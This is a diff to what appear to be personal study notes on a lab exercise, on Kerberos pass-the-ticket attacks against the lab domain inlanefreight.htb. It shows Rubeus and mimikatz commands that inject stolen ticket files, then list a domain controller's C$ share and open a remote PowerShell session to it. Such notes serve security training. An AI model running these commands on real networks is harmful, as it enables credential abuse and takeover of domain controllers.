@@ -501,5 +501,13 @@ c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aA
 
 ```
 mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+c:\tools> dir \\DC01.inlanefreight.htb\c$
 ```
 %% ptt attack but using mimikatz %%
+
+```
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+mimikatz # exit
+PS C:\tools> Enter-PSSession -ComputerName DC01
+```
